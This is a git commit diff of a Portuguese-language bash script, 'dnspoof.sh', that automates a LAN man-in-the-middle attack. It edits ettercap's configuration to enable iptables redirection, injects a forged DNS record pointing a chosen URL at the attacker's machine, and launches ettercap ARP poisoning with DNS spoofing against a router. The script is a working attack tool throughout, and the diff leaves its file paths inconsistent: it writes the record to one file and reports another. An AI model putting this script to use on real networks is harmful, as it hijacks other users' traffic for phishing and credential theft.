b23791db14144fccca69d0703668814b363c5668
W r e n c h <134978254+Jeanpseven@users.noreply.github.com>
2025-02-14 17:37:58 +0000

    Update dnspoof.sh

--- dnspoof.sh
+++ dnspoof.sh
@@ -10,9 +10,9 @@ read -p "Digite o IP do roteador (exemplo:192.168.0.1: " router
 
 # Verifica se o etter.conf existe e descomenta a linha que permite o redirecionamento
 if [ -f /etc/etter.conf ]; then
-    echo "se erros persistirem descomente os redir_comand no /etc/etter.conf,coloque os privs = 0,e edite o dns no /etc/ettercap/etter.dns"
-    sed -i 's/#redir_command_on = \"iptables/redir_command_on = \"iptables/g' /usr/local/etc/etter.conf
-    sed -i 's/#redir_command_off = \"iptables/redir_command_off = \"iptables/g' /usr/local/etc/etter.conf
+    echo "se erros persistirem descomente os redir_comand no /etc/ettercap/etter.conf,coloque os privs = 0,e edite o dns no /etc/ettercap/etter.dns"
+    sed -i 's/#redir_command_on = \"iptables/redir_command_on = \"iptables/g' /etc/ettercap/etter.conf
+    sed -i 's/#redir_command_off = \"iptables/redir_command_off = \"iptables/g' /etc/ettercap/etter.conf
     echo "Linhas de redirecionamento descomentadas em /etc/etter.conf"
 else
     echo "Arquivo etter.conf não encontrado!"
@@ -20,8 +20,8 @@ else
 fi
 
 # Adiciona a URL e IP ao arquivo etter.dns
-echo "$url A $iplocal" >> /usr/local/share/etter.dns
-echo "Redirecionamento DNS adicionado ao arquivo /usr/local/share/etter.dns"
+echo "$url A $iplocal" >> /usr/share/etter.dns
+echo "Redirecionamento DNS adicionado ao arquivo /etc/ettercap/etter.dns"
 
 # Executa o ettercap com as opções fornecidas
 ettercap -T -Q -i "$iface" -M arp -P dns_spoof /"$router"//
